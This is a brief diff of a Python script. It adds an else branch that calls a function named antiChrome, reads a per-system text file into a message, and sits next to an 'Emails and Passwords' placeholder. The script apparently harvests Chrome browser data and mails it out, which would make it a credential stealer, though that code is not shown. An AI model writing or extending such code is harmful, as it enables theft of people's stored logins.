@@ -52,6 +52,10 @@ def __main__():
             antiChrome()
             File = open(sysname+".txt", "r")
             msg2 = File.read()
+    else:
+        antiChrome()
+        File = open(sysname+".txt", "r")
+        msg2 = File.read()
     
     #Emails and Passwords
     email = 'youremailgoeshere'
